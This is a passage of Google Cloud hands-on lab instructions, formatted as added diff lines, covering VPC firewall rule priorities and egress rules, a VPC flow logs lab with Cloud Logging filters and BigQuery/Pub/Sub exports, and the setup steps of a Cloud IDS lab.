+1. On the **Navigation menu**, click **VPC network > VPC networks** to display the list of VPC networks in the Cloud Console.
+2. Click the **default** network to view the network details.
+3. Click **Delete VPC Network**.
+4. In the confirmation box, click **Delete**.
+5. Wait for the network to be deleted and verify that the default network is no longer displayed on the VPC Networks page.
+
+#### Task 3. Investigate the user-created networks
+
+In this task, you explore the user-created networks to verify no ingress is allowed without custom firewall rules.
+
+##### Verify that no ingress is allowed without custom firewall rules
+
+Remember, all networks have the following 2 rules (which will not be displayed in the Console) to block all incoming traffic and allow all outgoing traffic. Unlike the default network, user-created networks do not have any other rules by default, so currently no inbound traffic is allowed.
+
+![Default deny all ingress and default deny all egress rules](images/tv2tBmwKQMI9SNKmTAn%2F8%2FiUtUpvDfm260URbfnCC6o%3D.png)
+
+1. On the **Navigation menu**, click **Compute Engine > VM instances** to display a list of VM instances.
+2. In the row for **mynet-vm-1** or **mynet-vm-2**, click **SSH**.
+
+You should **NOT** be able to connect via SSH to the instances.
+
+You will now try to SSH into an instance from the Cloud Shell.
+
+1. Switch back to or reopen Cloud Shell.
+2. To try to ssh into the **mynet-vm-2** instance, run the following command:
+
+```
+gcloud compute ssh qwiklabs@mynet-vm-2 --zone us-central1-f
+```
+
+
+
+If prompted, type `Y` and press **Enter** twice to proceed.
+
+We should **NOT** be able to connect via SSH to the instances. There is currently no inbound access allowed. Igonre the error message **ERROR: (gcloud.compute.ssh) [/usr/bin/ssh] exited with return code [255]**
+
+#### Task 4. Create custom ingress firewall rules
+
+In this task, you use Cloud Shell as your client host to test SSH connectivity to the instances. The external IP address of the Cloud Shell instance can be easily retrieved.
+
+However, the IP address of your Cloud Shell instance can change if you close and reopen it, or if it is recycled due to inactivity. This should not be a problem during this lab. For a "real" project, you would allow the IP address of your SSH client host and there should not be a problem.
+
+**Note:** As you just verified, the browser-based console SSH feature used to connect to VM instances does not currently work. If you want to allow that, you need a firewall rule that allows the source IP address. However, source IP addresses for browser-based SSH sessions are dynamically allocated by the Cloud Console and can vary from session to session.
+
+
+
+For the feature to work, you must allow connections either from any IP address, or from Google's IP address range, which you can retrieve using public SPF records. Either of these options may pose unacceptable risks, depending on your requirements. Instead, you would allow the IP address of the SSH clients you are using to connect.
+
+##### Allow SSH access from Cloud Shell
+
+1. Switch back to or reopen Cloud Shell.
+2. To retrieve the external IP address of the Cloud Shell instance, run the following commands:
+
+```
+ip=$(curl -s https://api.ipify.org)
+echo "My External IP address is: $ip"
+```
+
+
+
+**Sample output** (your IP will be different):
+
+```
+My External IP address is: 35.229.72.135
+```
+
+1. To add a firewall rule that allows port 22 (SSH) traffic from the Cloud Shell IP address, run the following command:
+
+```
+gcloud compute firewall-rules create \
+mynetwork-ingress-allow-ssh-from-cs \
+--network mynetwork --action ALLOW --direction INGRESS \
+--rules tcp:22 --source-ranges $ip --target-tags=lab-ssh
+```
+
+
+
+This firewall rule is also given a target tag of *lab-ssh*, which means it applies only to instances that are tagged with the lab-ssh tag.
+
+1. To view the firewall rule in the Cloud Console, on the **Navigation menu**, click **VPC network > Firewall**.
+
+It will look similar to the following, but your IP address will be different:
+
+![Configuration for ingress lab-ssh firewall](https://cdn.qwiklabs.com/9uKhUJ%2FQAhtDY%2B5b5FXwBXuOImH%2F38MeUcSK7O6MzEk%3D)
+
+This firewall rule will be applied only to instances tagged with *lab-ssh*. It is currently not being applied to any instances.
+
+**Note:** You have just created and applied a firewall rule using a tag. One issue with tags is that they must be added to instances and could possibly be added or removed inadvertently. Firewall rules can also be applied to instances by the service account used. These rules will be applied automatically to all instances that use the specified service account.
+
+1. To add the lab-ssh network tag to the **mynet-vm-2** and **mynet-vm-1** instances, run the following commands in Cloud Shell:
+
+```
+gcloud compute instances add-tags mynet-vm-2 \
+    --zone us-central1-f \
+    --tags lab-ssh
+gcloud compute instances add-tags mynet-vm-1 \
+    --zone us-east4-a \
+    --tags lab-ssh
+```
+
+
+
+##### Stateful firewalls
+
+In VPC networks, firewall rules are stateful. So for each initiated connection tracked by allow rules in one direction, the return traffic is automatically allowed, regardless of any rules.
+
+1. To ssh into the **mynet-vm-2** instance, run the following command in Cloud Shell:
+
+```
+gcloud compute ssh qwiklabs@mynet-vm-2 --zone us-central1-f
+```
+
+
+
+It will take several seconds to negotiate the SSH keys, but the connection should succeed. This verifies that the firewall rule is allowing the traffic.
+
+1. Type `exit` to log off the **mynet-vm-2** instance.
+2. To ssh into the **mynet-vm-1** instance, run the following command in Cloud Shell:
+
+```
+ gcloud compute ssh qwiklabs@mynet-vm-1 --zone us-east4-a
+```
+
+
+
+This connection should also succeed because the **mynet-vm-1** instance is in the same network, and the firewall rule you created is allowing access to all instances.
+
+##### Allow all instances on the same network to communicate via ping
+
+1. While still logged in to the **mynet-vm-1** instance, try pinging the **mynet-vm-2** instance with the command shown below. (Replace the *[PROJECT_ID]* with the PROJECT_ID for your lab exercise.)
+
+```
+ ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
+```
+
+
+
+The ping command will not succeed. Even though the **mynet-vm-1** and the **mynet-vm-2** instances are in the same VPC network, all traffic is blocked by default unless there is a firewall rule allowing it.
+
+1. Press **Ctrl+C** to stop ping if needed. Do not log out of the **mynet-vm-1** instance yet.
+2. To open a new Cloud Shell window, click **Open a new tab** (**+**).
+3. To add a firewall rule that allows ALL instances in the mynetwork VPC to ping each other, run the following command:
+
+```
+gcloud compute firewall-rules create \
+mynetwork-ingress-allow-icmp-internal --network \
+mynetwork --action ALLOW --direction INGRESS --rules icmp \
+--source-ranges 10.128.0.0/9
+```
+
+
+
+**Note:** This firewall rule does not use a target-tag and therefore applies to all instances in the network by default. There is no need to tag any instances for this firewall to take effect. This kind of firewall rule is useful if all instances in a network need the same rule, but should also be used with caution because they affect all instances.
+
+1. Switch back to the first Cloud Shell session that is connected to **mynet-vm-1** and run the ping again. This time it should work.
+
+```
+ ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
+```
+
+
+
+Notice that the hostname *mynet-vm-2* resolved to the internal IP address of the instance. The internal IP will start with *10.132.0* (for example, *10.132.0.2*). Google Cloud resolves internal hostnames for you.
+
+1. Press **Ctrl+C** to stop ping.
+2. You can also try pinging the internal IP address directly and that will also work. Press **Ctrl+C** to stop ping.
+3. To locate the external IP address of **mynet-vm-2**, on the **Navigation menu**, click **Compute Engine > VM instances**.
+4. Click on **mynet-vm-2**, locate and copy the external IP address of the instance.
+5. From the Cloud Shell session that is connected to **mynet-vm-1**, try to ping the external IP address of the **mynet-vm-2** instance:
+
+```
+ ping <external_ip_of_mynet-vm-2>
+</external_ip_of_mynet-vm-2>
+```
+
+
+
+This should **NOT** work. When you ping the external IP address, the connection goes through the internet gateway, which causes the request to be NATed. The request is now coming from the *external* IP address of the mynet-vm-1 instance. The firewall rule is to only allow ICMP requests that come from *internal* IP addresses.
+
+1. Press **Ctrl+C** to stop ping.
+
+Click *Check my progress* to verify the objective.
+
+Create custom ingress firewall rules
+
+
+
+Check my progress
+
+
+
+#### Task 5. Set the firewall rule priority
+
+In this task, you set the firewall rule priority to deny ICMP traffic. You then verify that any traffic that does not match the rule priority is denied.
+
+So far, all the rules created have been ingress allow rules, so the priority has not been important. Firewall rules can be both allow and deny, can specify ingress and egress, and have a priority from 0 to 65,535. If you do not set a priority, the default is 1,000. Rules are evaluated based on priority, starting from the lowest value. The first rule that matches gets applied.
+
+1. In the first Cloud Shell session, verify that you are still connected to the **mynet-vm-1** instance. You can tell because the prompt will be: `qwiklabs@mynet-vm-1:~$`.
+
+If not connected, use the following command to reconnect:
+
+```
+ gcloud compute ssh qwiklabs@mynet-vm-1 --zone us-east4-a
+```
+
+
+
+1. Verify that you can still ping the **mynet-vm-2** instance:
+
+```
+ ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
+```
+
+
+
+1. Press **Ctrl+C** to stop ping.
+2. Switch to your second Cloud Shell window (or open a new one).
+3. In the second Cloud Shell, create a firewall ingress rule to deny ICMP traffic from any IP with a priority of 500:
+
+```
+gcloud compute firewall-rules create \
+mynetwork-ingress-deny-icmp-all --network \
+mynetwork --action DENY --direction INGRESS --rules icmp \
+--priority 500
+```
+
+
+
+1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance, and try to ping the **mynet-vm-2** instance:
+
+```
+ ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
+```
+
+
+
+It should no longer work. This new rule has a priority of 500, where the allow rule is 1,000.
+
+1. Press **Ctrl+C** to stop ping.
+
+Now change the deny rule to a priority of 2,000.
+
+1. In the second Cloud Shell, modify the firewall rule just created and change the priority to `2000`:
+
+```
+gcloud compute firewall-rules update \
+mynetwork-ingress-deny-icmp-all \
+--priority 2000
+```
+
+
+
+1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance, and try to ping the **mynet-vm-2** instance again:
+
+```
+ ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
+```
+
+
+
+This time it will work because the deny rule has a lower priority, so the allow rule is the first matching rule.
+
+1. Press **Ctrl+C** to stop ping.
+
+#### Task 6. Configure egress firewall rules
+
+In this task, you create an egress firewall rule and set the priority to 10,000. You then verify that both ingress and egress rule allow that traffic.
+
+1. From the second Cloud Shell window, list all the current firewall rules:
+
+```
+gcloud compute firewall-rules list \
+--filter="network:mynetwork"
+```
+
+
+
+Currently, the VMs are still able to ping each other because the rule that denies ICMP has a higher priority than the allow ICMP rule.
+
+Now try an egress rule.
+
+1. Create a firewall egress rule to block ICMP traffic from any IP with a priority of `10000`:
+
+```
+gcloud compute firewall-rules create \
+mynetwork-egress-deny-icmp-all --network \
+mynetwork --action DENY --direction EGRESS --rules icmp \
+--priority 10000
+```
+
+
+
+1. List all the current firewall rules again:
+
+```
+gcloud compute firewall-rules list \
+--filter="network:mynetwork"
+```
+
+
+
+Notice that the egress rule priority is set to 10,000, which is much higher than the rules created earlier.
+
+1. Switch back to the first Cloud Shell connected to the **mynet-vm-1** instance and try to ping the **mynet-vm-2** instance:
+
+```
+ ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal
+```
+
+
+
+**It should no longer work**. Even though the egress rule has a much higher priority of 10,000, it is still blocking traffic. This is because for traffic to be allowed, there must be both an ingress and egress rule allowing that traffic. The priority of ingress rules does not affect the priority of egress rules.
+
+1. Press **Ctrl+C** to stop ping.
+
+Click *Check my progress* to verify the objective.
+
+Create a firewall rule with priority and egress firewall rule.
+
+
+
+Check my progress
+
+
+
+#### Congratulations!
+
+In this lab, you did the following:
+
+- Created an auto-mode network, a custom-mode network, and associated subnetworks.
+- Investigated firewall rules in the default network, and then deleted the default network.
+- Used firewall rule features for more precise and flexible control of connections.
+
+### LAB - Configuring and Using VPC Flow Logs in Cloud Logging
+
+#### Overview
+
+In this lab, you will investigate [VPC flow logs](https://cloud.google.com/vpc/docs/flow-logs). VPC flow logs record network flows sent from or received by VM instances. These logs can be used for network monitoring, forensics, real-time security analysis, and even for expense optimization.
+
+During this lab you enable VPC flow logging and use Cloud Logging to view the logs. Next, you perform network monitoring, forensics, and real-time security analysis, before finally, disabling VPC flow logging.
+
+##### Objectives
+
+In this lab, you learn how to:
+
+- Enable VPC flow logging for a subnet.
+- Access logs via Cloud Logging.
+- Filter logs for specific subnets, VMs, ports, or protocols.
+- Perform network monitoring, forensics, and real-time security analysis.
+- Disable VPC flow logging.
+
+#### Setup and requirements
+
+For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.
+
+1. Sign in to Qwiklabs using an **incognito window**.
+2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
+   There is no pause feature. You can restart if needed, but you have to start at the beginning.
+3. When ready, click **Start lab**.
+4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
+5. Click **Open Google Console**.
+6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
+   If you use other credentials, you'll receive errors or **incur charges**.
+7. Accept the terms and skip the recovery resource page.
+
+**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.
+
+##### Activate Google Cloud Shell
+
+Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.
+
+Google Cloud Shell provides command-line access to your Google Cloud resources.
+
+1. In Cloud console, on the top right toolbar, click the Open Cloud Shell button.
+
+   ![Highlighted Cloud Shell icon](https://cdn.qwiklabs.com/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D)
+
+2. Click **Continue**.
+
+It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your *PROJECT_ID*. For example:
+
+![Project ID highlighted in the Cloud Shell Terminal](https://cdn.qwiklabs.com/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D)
+
+**gcloud** is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.
+
+- You can list the active account name with this command:
+
+```
+gcloud auth list
+```
+
+Copied!
+
+**Output:**
+
+```
+Credentialed accounts:
+ - <myaccount>@<mydomain>.com (active)
+</mydomain></myaccount>
+```
+
+**Example output:**
+
+```
+Credentialed accounts:
+ - google1623327_student@qwiklabs.net
+```
+
+- You can list the project ID with this command:
+
+```
+gcloud config list project
+```
+
+Copied!
+
+**Output:**
+
+```
+[core]
+project = <project_id>
+</project_id>
+```
+
+**Example output:**
+
+```
+[core]
+project = qwiklabs-gcp-44776a13dea667a6
+```
+
+**Note:** Full documentation of **gcloud** is available in the [gcloud CLI overview guide ](https://cloud.google.com/sdk/gcloud).
+
+#### Task 1. Enable VPC flow logging
+
+In this task, you enable flow logging for two subnets. Flow logging can also be enabled in exactly the same manner for custom user-defined networks. Flow logging can also be enabled when you create a subnet in one step.
+
+##### **Use gcloud in Cloud Shell to enable VPC flow logging on two subnets**
+
+1. To enable flow logging in two subnets, run the following commands in Cloud Shell:
+
+```
+gcloud compute networks subnets update default \
+--region us-central1 --enable-flow-logs \
+--logging-metadata=include-all
+```
+
+Copied!
+
+```
+gcloud compute networks subnets update default \
+--region europe-west4 --enable-flow-logs \
+--logging-metadata=include-all
+```
+
+Copied!
+
+Notice that you enabled VPC flow logging for the subnets in `us-central1` and `europe-west4`. None of the other subnets have flow logging enabled.
+
+1. To create three instances in different subnets (to be used for later testing), run the following commands:
+
+```
+gcloud compute instances create default-us-vm \
+--machine-type e2-micro \
+--zone=us-central1-c --network=default
+```
+
+Copied!
+
+```
+gcloud compute instances create default-eu-vm \
+--machine-type e2-micro \
+--zone=europe-west4-a --network=default
+```
+
+Copied!
+
+```
+gcloud compute instances create default-ap-vm \
+--machine-type e2-micro \
+--zone=asia-south1-b --network=default
+```
+
+Copied!
+
+**Note:** If you get a `ZONE_RESOURCE_POOL_EXHAUSTED` error, update the zone in the gcloud command and try running it again. For example, if `us-central1-a` is failing, try `us-central1-b`instead.
+
+Click *Check my progress* to verify the objective.
+
+Enable VPC flow logging on subnets and create instances
+
+
+
+Check my progress
+
+
+
+#### Task 2. Generate network traffic for testing
+
+In this task, you create network traffic to test the connectivity between the instances.
+
+1. In the Google Cloud Console, on the **Navigation menu**, click **Compute Engine > VM instances** to display a list of VM instances.
+2. Record both the internal and external IP addresses of each instance. You will need these IPs later in this lab.
+
+| **Instance**  | **Internal IP** | **External IP** |
+| :------------ | :-------------- | :-------------- |
+| default-ap-vm | `*****`         | `*****`         |
+| default-eu-vm | `*****`         | `*****`         |
+| default-us-vm | `*****`         | `*****`         |
+
+1. In the row for the `default-us-vm` instance, click **SSH**.
+2. When connected via SSH, issue the following commands:
+
+```
+sudo apt-get install -y host
+host www.wikipedia.org 8.8.8.8
+ping -c 5 default-eu-vm.europe-west4-a
+ping -c 5 www.google.com
+curl http://www.google.com
+```
+
+Copied!
+
+These commands did the following:
+
+- Installed the host DNS resolution utility.
+- Performed a DNS lookup of www.wikipedia.org using the 8.8.8.8 DNS server.
+- Pinged the **default-eu-vm** instance and [www.google.com](https://www.google.com/)
+- Used curl to create an HTTP connection to [www.google.com](https://www.google.com/)
+
+Next, you run the same commands as above, but instead of pinging the default-eu-vm from the default-us-vm, you ping the default-us-vm from the default-eu-vm.
+
+1. Return to the Cloud Console, and in the row for the `default-eu-vm` instance, click **SSH**.
+2. When connected via SSH, issue the following commands:
+
+```
+sudo apt-get install -y host
+host www.wikipedia.org 8.8.8.8
+ping -c 5 default-us-vm.us-central1-c
+ping -c 5 cloud.google.com
+curl http://www.google.com
+```
+
+Copied!
+
+1. Return to the Cloud Console, and in the row for the `default-ap-vm` instance, click **SSH**.
+2. When connected via SSH, issue the following commands:
+
+```
+sudo apt-get install -y host
+host www.bitnami.com 8.8.8.8
+curl http://www.bitnami.com
+```
+
+Copied!
+
+#### Task 3. View flow logs in Cloud Logging
+
+In this task, you view the VPC flow logs for all the projects in Cloud Logging.
+
+##### **Access all flow logs**
+
+1. In the Cloud Console, go to the **Navigation menu** > **Logging** > **Logs Explorer**. (If you do not see this menu option, then continue this lab, at step 3).
+2. In the **Query** panel, under **All Resource**, click **Subnetwork** and then **Apply**.
+3. Under **All Log names**, click **compute.googleapis.com/vpc_flows** and then **Apply**.
+
+**Note:** If no log names appear for the above, try pasting in `compute.googleapis.com%2Fvpc_flows` instead.
+
+1. Click **Run query**.
+2. In the Query results panel, entries from the VPC flow logs appear. If you do not see **compute.googleapis.com/vpc_flows**, wait a few minutes for this log type to show up.
+
+**Note:** This should show all the VPC flow logs for your project. Remember, you only have the flow logs enabled for two of the subnets.
+
+1. Expand one of the log entries.
+2. Within that log entry, expand `jsonPayload`, and then expand `connection`.
+
+**Note:** Some entries do not have `jsonPayload` fields. You may need to open other entries until you find one that does.
+
+1. Investigate the information about the connection; specifically notice that the port and IP address of both the source and destination have been logged.
+2. Find a log that has `src_instance` in `jsonPayload`. Investigate the information about this src instance.
+
+The `src_instance` may be one of your instances or an outside IP address if the traffic came from outside your VPC network.
+
+![Source location log with VM Instance field](https://cdn.qwiklabs.com/xTE%2FP%2FhkKqxqQUu2KVDKpGWRatK2lpcfp%2Bhs3lzQ%2FaA%3D)
+
+1. Investigate any other information in this log entry or another.
+
+#### Task 4. Perform advanced filtering
+
+In this task, you perform advanced filtering using Query builder. You also explore access logs for specific source or destination IP, and for specific ports and protocols.
+
+An advanced logs filter is a Boolean expression that specifies a subset of all the log entries in your project. A few things it can be used for include:
+
+- Choosing log entries for specific VMs.
+- Choosing log entries for specific source or destination ports.
+- Choosing log entries for specific source or destination IP address.
+- Choosing log entries specific protocols.
+
+1. Click inside the **Query** box.
+2. Remove the current query and paste in the following, replacing `<INSERT_PROJECT_ID>` with your Qwiklabs Google Cloud Project ID:
+
+```
+resource.type="gce_subnetwork"
+log_name="projects/<INSERT_PROJECT_ID>/logs/compute.googleapis.com%2Fvpc_flows"
+```
+
+Copied!
+
+1. Click **Run query**.
+
+**Note:** For the remainder of this lab, be sure to always leave these two lines at the start of the filter. You will be adding additional lines after these two. If you accidentally delete or modify these two lines, copy them from above (be sure to change the project ID).
+
+##### **Access logs for a specific source or destination IP address**
+
+1. Add the following line to the end of the filter. Replace `Internal_IP_Of_default_us_vm` with the internal IP address of your `default_us_vm` instance (you recorded this earlier):
+
+```
+jsonPayload.connection.src_ip="Internal_IP_Of_default_us_vm"
+```
+
+Copied!
+
+1. Click **Run query**.
+
+You now see all the log entries where the source IP address is the internal IP address of the `default-us-vm` instance. These should be the same entries as for the earlier filter that showed the source instance of `default-us-vm`.
+
+##### **Access logs for specific ports and protocols**
+
+1. Delete the last line in the filter (the one matching `src_ip`) and replace it with the following line that will only show entries with a destination port of 22 (SSH):
+
+```
+jsonPayload.connection.dest_port=22
+```
+
+Copied!
+
+1. Click **Run query** and observe the results. You should see three logs because you SSH-ed into the VMs three times.
+2. Modify the last line of the filter to only show traffic with a destination port of 80 (HTTP):
+
+```
+jsonPayload.connection.dest_port=80
+```
+
+Copied!
+
+1. Click **Run query** and observe the results.
+2. Match multiple ports by replacing the last line and adding this statment with an `OR` to the end of the port filter:
+
+```
+jsonPayload.connection.dest_port=(80 OR 22)
+```
+
+Copied!
+
+1. Change the last line in the filter to only show entries using the UDP protocol (protocol #17):
+
+```
+jsonPayload.connection.protocol=17
+```
+
+Copied!
+
+1. Click **Run query** and observe the results.
+
+You may see a few entries in the log. These would correspond to the DNS calls you made with the host utility.
+
+1. Investigate one of the log entries and locate the destination port number that DNS uses.
+
+**Note:** DNS uses port 53.
+
+1. Modify the filter to show all entries with a protocol of 17 and destination port of 53:
+
+```
+jsonPayload.connection.protocol=17
+jsonPayload.connection.dest_port=53
+```
+
+Copied!
+
+1. Click **Run query** and observe the results.
+
+**Note:** Currently, flow logs only monitor UDP (protocol #17) and TCP (protocol #6). Earlier, you generated some ICMP traffic on the instances using `ping`. ICMP is protocol #1. If you create a filter to show protocol #1, you will not see any entries. Try this if you want.
+
+#### Task 5. Perform network monitoring and support real-time security analysis
+
+In this task, you create a filter and use it to see whether any RDP traffic is attempting to access the VPC.
+
+##### **Search for unexpected ports and protocols**
+
+Because you are running Linux instances within the VPC network, you should not see any RDP traffic. However, there is a firewall rule within the default settings that allows RDP traffic from anywhere, and this means that someone or something on the internet could attempt to connect to your servers using the RDP protocol.
+
+1. Modify the flow log filter to show all traffic with a destination port of 3389 (RDP). Be sure to leave the first two lines of the existing filter, but delete and replace the other lines with the following and click **Run query**:
+
+```
+jsonPayload.connection.dest_port=3389
+```
+
+Copied!
+
+1. If you see any RDP traffic, investigate where the traffic is coming from. You may not see any RDP traffic, but it is common to see at least some. If you did not see any traffic, wait a few minutes and check again.
+
+If you did see some RDP traffic, which often happens, that demonstrates how pervasive unwanted traffic can be on the internet. It also shows why ensuring that VPC networks and firewall rules are set up correctly is important.
+
+By using the default VPC in this lab, with all of the default firewall rules, you saw the results of not fine-tuning these rules to help exclude unwanted traffic.
+
+**Note:** It is a recommended best practice for production systems to use a custom VPC with very specific firewall rules and delete the default VPC.
+
+**Note:** Another service that can help with issues like restricting unwanted traffic is [Google Cloud Armor](https://cloud.google.com/armor/). Google Cloud Armor delivers defense at scale against infrastructure and application Distributed Denial of Service (DDoS) attacks using Google's global infrastructure and security systems.
+
+##### Create exports to support real-time security analysis
+
+Flow logs can be exported to any destination that Cloud Logging export supports (Pub/Sub, BigQuery, etc.). Creating an export will export future matching logs to the selected destination, existing logs will not be exported.
+
+Exporting logs to BigQuery allows for the BigQuery analysis tools to be used on your logs to perform analysis. Exporting logs to Pub/Sub allows your logs to be streamed to other applications, other repositories, or third parties.
+
+When you create a Cloud export, the current filter will be applied to the export. This means that only events that match the filter will be exported. For example, if you have a filter that only displays traffic to the destination port 3389, only traffic that matches that filter will be exported.
+
+This can help reduce the amount of data that is exported (which could lower costs) or allow for different exports depending on what the data contains. For this lab you will clear the filter and export all logs because you do not have much traffic.
+
+1. Clear all the text in the query editor and click **Run query**.
+2. Click **Actions** > **Create Sink**.
+3. For "Sink name", type **FlowLogBQExport** and click **Next**.
+4. For "Select sink service", select **BigQuery dataset**.
+5. For "Select Bigquery dataset", select **Create new BigQuery dataset**.
+6. For "Dataset ID", type `flowlogs_dataset`, and then click **Create dataset**.
+7. Click **Create sink**. The Logs Router Sinks page appears.
+
+You should be able to see the sink you created **(FlowLogBQExport)**. If you are unable to see the sink click on **Logs Router**.
+
+1. On the right side, click the **More actions** menu (![more_menu.png](https://cdn.qwiklabs.com/EAVAvFhminZXqeUIlGzj2ylRyw7YT4PycCIK1UZk3M4%3D)) for your export and select **View sink details**.
+2. Click **Cancel**.
+
+**Note:** All future logs will now be exported to BigQuery. The BigQuery tools can now be used to perform analysis on the flow log data. You will perform a simple query in BigQuery later in the lab.
+
+**Note:** You could also export log entries to Pub/Sub or Cloud Storage. Exporting to Pub/Sub can be useful if you want to flow through an ETL process before storing in a database **(Operations > Pub/Sub > Dataflow > BigQuery/Cloud Bigtable)**. Exporting to Cloud Storage will batch up entries and write them into Cloud Storage objects approximately every hour.
+
+Now create an export to Pub/Sub.
+
+1. On the Logs Router page, click **Create sink**.
+2. For "Sink name", type **FlowLogPubSubExport**, and click **Next**.
+3. Select "Select sink service" as **Cloud Pub/Sub topic**.
+4. For "Select a Cloud Pub/Sub topic", select **Create a Topic**.
+5. For Topic ID, type **FlowLogsTopic**, and then click **Create**.
+6. Click **Create sink**.
+
+The Logs Router Sinks page appears. You should be able to see the sink you created (FlowLogsTopic). If you are unable to see the sink click on **Logs Router**.
+
+1. On the right side, click the **More actions** menu for your export and select **View sink details**.
+
+This will show the filter that was present when the export was created.
+
+1. Click **Cancel**.
+
+You can now subscribe to the new Pub/Sub topic and receive notifications when new logs are available. This allows for the logs to be streamed to and integrated with a SIEM (Security Information and Event Management) tool.
+
+SIEM tools are used to gain real-time operational insights and create audit reports using powerful visualization capabilities.
+
+#### Task 6. Analyzing flow logs in BigQuery
+
+In this task, you analyze flow logs in BigQuery.
+
+**Note:** When you export logs to a BigQuery dataset, Cloud Logging creates dated tables to hold the exported log entries. Log entries are placed in tables whose names are based on the entries' log names.
+
+1. In the Cloud Console, on the **Navigation menu**, click **BigQuery**.
+2. In the navigation pane under **Explorer**, expand the project name to see the **flowlogs_dataset** dataset.
+3. Expand the dataset to see the table with your exported flow logs.
+4. Click on the table name that starts with `compute_googleapis_com_vpc_flows_` and review the schemas and details of the tables that are being used.
+
+**Note:** If you don't see that table appear in the dataset, open the navigation menu and click "Cloud Overview" or any other service. Then, open the navigation menu and select BigQuery and try to find the table again (it sometimes takes a minute or two for the table to appear in the dataset).
+
+1. Click **Query**.
+2. Delete the text provided in the **New query** window and paste in the query below:
+
+```
+#standardSQL
+SELECT
+   jsonPayload.connection.dest_ip,
+   resource
+FROM
+   `flowlogs_dataset.compute_googleapis_com_vpc_flows*` WHERE
+   jsonPayload.connection.dest_port = 22
+LIMIT 1000
+```
+
+Copied!
+
+1. Click **Run**.
+
+This query returns information about traffic connecting to port 22.
+
+After a couple of seconds, the results are displayed. You should see one or two entries, which is the activity you generated in this lab. Remember, BigQuery is only showing activity since the export was created.
+
+**Note:** If you did not see any results, you may need to generate some traffic to the instances. To do so, go to the **Navigation menu > Compute Engine** and click **SSH** for each instance. Then try the query again.
+
+Click *Check my progress* to verify the objective.
+
+Create exports and analyze flow logs in BigQuery
+
+
+
+Check my progress
+
+
+
+#### Task 7. Disable flow logging
+
+In this task, you disable VPC flow logging. VPC flow logging can be turned off with the `--no-enable-flow-logs` option.
+
+1. Try disabling it on one of your subnets by running the following command in the Cloud Shell terminal:
+
+```
+gcloud compute networks subnets update default \
+--region europe-west4 --no-enable-flow-logs
+```
+
+Copied!
+
+1. You can verify that it has been disabled by viewing the VPC in the Cloud Console. On the **Navigation menu**, click **VPC network > VPC networks**. If prompted click on **LEAVE**.
+
+#### Task 8. Review
+
+In this lab, you enabled VPC flow logging for a subnet. You accessed logs via Cloud Logging. You also filtered logs for specific subnets, VMs, ports, and protocols. Next, you performed network monitoring, forensics, and real-time security analysis. Finally, you disabled VPC flow logging.
+
+### LAB - Getting Started with Cloud IDS
+
+#### Overview
+
+In this lab, you deploy [Cloud Intrusion Detection System (Cloud IDS)](https://cloud.google.com/intrusion-detection-system), a next-generation advanced intrusion detection service that provides threat detection for intrusions, malware, spyware, and command-and-control attacks. You simulate multiple attacks and view the threat details in the Google Cloud console.
+
+![Cloud IDS Infrastructure Diagram](images/ENIYqVr9SB12IcIIqVmupO%2BfT7DCqkiZdHgtHJtYDuA%3D.png)
+
+#### Objectives
+
+In this lab, you learn how to perform the following tasks:
+
+- Build out a Google Cloud networking environment as shown in the previous diagram.
+- Create a Cloud IDS endpoint.
+- Create two virtual machines using gcloud CLI commands.
+- Create a Cloud IDS packet mirroring policy.
+- Simulate attack traffic from a virtual machine.
+- View threat details in the Cloud console and Cloud Logging.
+
+#### Setup
+
+##### Before you click the Start Lab button
+
+**Note: Read these instructions.**
+
+
+
+Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources will be made available to you.
+
+This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.
+
+##### What you need
+
+To complete this lab, you need:
+
+- Access to a standard internet browser (Chrome browser recommended).
+- Time to complete the lab.
+
+**Note:** If you already have your own personal Google Cloud account or project, do not use it for this lab.
+
+**Note:** If you are using a Pixelbook, open an Incognito window to run this lab.
+
+##### How to start your lab and sign in to the Console
+
+1. Click the **Start Lab** button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.
+
+   ![Credentials panel](images/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D.png)
+
+2. Copy the username, and then click **Open Google Console**. The lab spins up resources, and then opens another tab that shows the **Choose an account** page.
+
+   **Note:** Open the tabs in separate windows, side-by-side.
+
+3. On the Choose an account page, click **Use Another Account**. The Sign in page opens.
+
+   ![Choose an account dialog box with Use Another Account option highlighted ](images/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D.png)
+
+4. Paste the username that you copied from the Connection Details panel. Then copy and paste the password.
+
+**Note:** You must use the credentials from the Connection Details panel. Do not use your Google Cloud Skills Boost credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).
+
+1. Click through the subsequent pages:
+
+- Accept the terms and conditions.
+- Do not add recovery options or two-factor authentication (because this is a temporary account).
+- Do not sign up for free trials.
+
+After a few moments, the Cloud console opens in this tab.
+
+**Note:** You can view the menu with a list of Google Cloud Products and Services by clicking the **Navigation menu** at the top-left. ![Cloud Console Menu](images/9vT7xPlxoNP%2FPsK0J8j0ZPFB4HnnpaIJVCDByaBrSHg%3D.png)
+
+##### Activate Google Cloud Shell
+
